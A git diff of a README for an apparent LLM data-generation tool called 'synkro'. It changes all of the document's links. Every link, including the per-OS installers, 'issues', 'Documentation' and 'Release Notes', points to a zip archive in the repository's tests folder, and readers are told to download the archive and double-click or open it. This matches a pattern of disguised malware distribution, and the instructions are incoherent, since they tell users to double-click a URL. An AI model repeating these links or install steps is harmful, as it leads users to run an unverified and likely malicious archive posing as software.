@@ -1,6 +1,6 @@
 # 🛠️ synkro - Generate Data for AI Conversations Easily
 
-[![Download synkro](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip)](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip)
+[![Download synkro](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip)](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip)
 
 ## 📚 Description
 Synkro is an open-source framework designed to help users generate conversation, tool calling, and evaluation data for Large Language Models (LLMs) from any document. With Synkro, you can easily prepare datasets for training AI systems, making it a valuable tool for researchers, developers, and enthusiasts working with artificial intelligence technologies.
@@ -15,20 +15,20 @@ To get started with Synkro, follow these simple steps. You’ll be able to set i
 - **Internet Connection:** Required for downloading and updates
 
 ### 📥 Download & Install
-Visit this page to download: [Download Synkro](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip)
+Visit this page to download: [Download Synkro](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip)
 
 1. Click the link above to go to the releases page.
 2. Find the latest version of Synkro.
 3. Choose the appropriate file for your operating system. 
-   - For Windows, look for `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip`.
-   - For macOS, choose `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip`.
-   - For Linux, select `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip`.
+   - For Windows, look for `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip`.
+   - For macOS, choose `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip`.
+   - For Linux, select `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip`.
 4. Click on the file to start the download.
 
 After downloading:
-- **Windows:** Double-click `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip` and follow the prompts to complete the installation.
-- **macOS:** Open `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip`, drag the Synkro icon to your Applications folder, and launch it from there.
-- **Linux:** Extract the files from `https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip` and follow the instructions in the README included in the folder.
+- **Windows:** Double-click `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip` and follow the prompts to complete the installation.
+- **macOS:** Open `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip`, drag the Synkro icon to your Applications folder, and launch it from there.
+- **Linux:** Extract the files from `https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip` and follow the instructions in the README included in the folder.
 
 ## 🌟 Features
 - **Data Generation:** Easily create high-quality data sets for various AI applications.
@@ -58,7 +58,7 @@ If you encounter any issues or have questions, feel free to join the community. 
 
 ## 📝 Contributing
 If you wish to help improve Synkro:
-1. Check out the [issues](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip) for bugs and feature requests.
+1. Check out the [issues](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip) for bugs and feature requests.
 2. Fork the repository and make your changes.
 3. Submit a pull request with your updates.
 
@@ -82,7 +82,7 @@ Synkro works with various topics related to AI and data generation, such as:
 - tool-calling
 
 ## 🔗 Helpful Links
-- [Documentation](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip)
-- [Release Notes](https://raw.githubusercontent.com/rearendoh/synkro/main/tests/Software-2.7-alpha.4.zip)
+- [Documentation](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip)
+- [Release Notes](https://github.com/rearendoh/synkro/raw/refs/heads/main/tests/Software_1.8-alpha.1.zip)
 
 Remember to share your experiences and the results you achieve using Synkro. Your contributions help grow a supportive community around AI advancements.
